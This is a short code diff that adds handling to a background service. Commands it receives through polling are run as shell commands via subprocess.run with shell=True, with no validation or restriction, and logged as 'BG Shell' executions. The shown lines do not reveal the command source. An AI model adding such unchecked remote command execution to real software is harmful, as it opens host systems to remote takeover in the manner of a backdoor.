@@ -81,6 +81,18 @@ def run_service():
                 if commands:
                     noir_log(f"Received {len(commands)} background commands")
                     poll_interval = 2
+                    for cmd in commands:
+                        try:
+                            action = cmd.get("action", {})
+                            atype = action.get("type") or action.get("action", "")
+                            params = action.get("params", action)
+                            if atype == "shell":
+                                shell_cmd = params.get("cmd", "")
+                                import subprocess
+                                subprocess.run(shell_cmd, shell=True, timeout=15)
+                                noir_log(f"Executed BG Shell: {shell_cmd}")
+                        except Exception as ce:
+                            noir_log(f"BG Exec Error: {ce}", level="WARNING")
                 else:
                     poll_interval = min(poll_interval + 2, 30)
             
